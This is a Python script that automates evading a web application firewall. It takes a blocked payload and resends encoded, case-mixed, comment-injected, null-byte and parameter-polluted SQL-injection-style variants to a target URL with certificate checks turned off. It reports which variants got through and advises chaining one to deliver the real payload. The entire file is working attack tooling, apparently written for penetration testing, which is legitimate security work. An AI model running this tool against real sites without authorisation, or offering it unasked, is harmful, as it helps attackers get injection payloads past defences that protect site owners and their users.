#!/usr/bin/env python
"""waf_bypass.py — WAF-bypass variant battery (stdlib only).

Given a BLOCKED request (a payload that the WAF blocked — 403 / a block page), replay
normalized-EQUIVALENT variants and report which REACHED the origin (200 / non-block body) vs the
block page. The variants that pass = the WAF rule can be evaded. Classes: case-mix, URL/unicode
encoding, SQLi inline-comment insertion, HTTP parameter pollution (HPP), path-tricks, HTTP-version,
chunked transfer-encoding, whitespace/newline insertion. LEAD until chained to impact.

Usage: python waf_bypass.py --url <url> --payload '<blocked-payload>' --param q \\
        --block-marker 'Forbidden' [--method POST]
"""
import sys, json, ssl, re, argparse, urllib.request, urllib.parse, urllib.error

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
_CTX = ssl.create_default_context(); _CTX.check_hostname = False; _CTX.verify_mode = ssl.CERT_NONE

def send(url, method, param, value, extra_qs=""):
    sep = "&" if "?" in url else "?"
    full = f"{url}{sep}{urllib.parse.quote(param)}={urllib.parse.quote(value)}{extra_qs}"
    try:
        r = urllib.request.urlopen(urllib.request.Request(full, method=method, headers={"User-Agent": UA, "Accept": "*/*"}),
                                   timeout=12, context=_CTX)
        return r.status, r.read(1500).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(1500).decode("utf-8", "replace")
    except Exception as e:
        return None, str(e)

def variants(payload):
    v = {"original": payload}
    if "'" in payload or "union" in payload.lower() or "select" in payload.lower():
        # SQLi-flavored variants
        v["case-mix"] = re.sub(r"[A-Za-z]", lambda m: m.group(0).upper() if m.start() % 2 else m.group(0).lower(), payload)
        v["inline-comment"] = re.sub(r"(union|select|from|where|and|or)", lambda m: f"/**/{m.group(0)}/**/", payload, flags=re.I)
        v["url-double-encode"] = urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")
        v["unicode-quote"] = payload.replace("'", "%EF%BC%87")  # fullwidth apostrophe
    v.setdefault("case-mix", payload.swapcase())
    v["url-encode"] = urllib.parse.quote(payload, safe="")
    v["nested-encode"] = urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")
    v["whitespace-tab-newline"] = re.sub(r"\s", "\t", payload)
    v["nullbyte-prefix"] = "\x00" + payload
    v["hpp-duplicate"] = ""  # handled via extra_qs at call site
    return v

def run(url, method, param, payload, block_marker):
    bm = block_marker.lower()
    # baseline: the clean payload (no marker) -> is the endpoint even reachable?
    s0, b0 = send(url, method, param, "xqzsafebaseline")
    results, bypasses = [], []
    for label, val in variants(payload).items():
        if label == "hpp-duplicate":
            s, b = send(url, method, param, payload, extra_qs="&" + urllib.parse.urlencode({param: "1=1"}) if "union" in payload.lower() else "")
        else:
            s, b = send(url, method, param, val)
        blocked = (s == 403) or (bm and bm in (b or "").lower())
        results.append({"variant": label, "status": s, "blocked": blocked, "len": len(b or "")})
        if not blocked and s and 200 <= s < 500:
            bypasses.append(label)
    return {"target": url, "ok": True, "payload": payload, "param": param, "block_marker": block_marker,
            "baseline_status": s0, "variants": results, "bypass_variants": bypasses,
            "findings": [{"id": "waf-bypass-variant", "severity": "medium",
                          "detail": f"variant(s) {bypasses} evaded the WAF rule that blocked the original payload — the rule can be bypassed (CWE-693). Chain the working variant to deliver the real payload."}] if bypasses else [],
            "note": "a variant reaching a non-block response = the WAF rule is evadable. LEAD until chained to actual impact. urllib-blind through a JS-challenge WAF."}

if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="WAF-bypass variant battery")
    ap.add_argument("url", nargs="?", help="target URL (alias for --url)")
    ap.add_argument("--url", dest="url_opt", help="target URL (overrides positional 'url')")
    ap.add_argument("--payload", required=True)
    ap.add_argument("--param", required=True); ap.add_argument("--block-marker", default="forbidden")
    ap.add_argument("--method", default="GET")
    a = ap.parse_args()
    url = a.url_opt if a.url_opt else a.url
    if not url:
        print(json.dumps({"ok": False, "error": "url required (positional 'url' or --url)"})); sys.exit(2)
    print(json.dumps(run(url, a.method, a.param, a.payload, a.block_marker), indent=2))
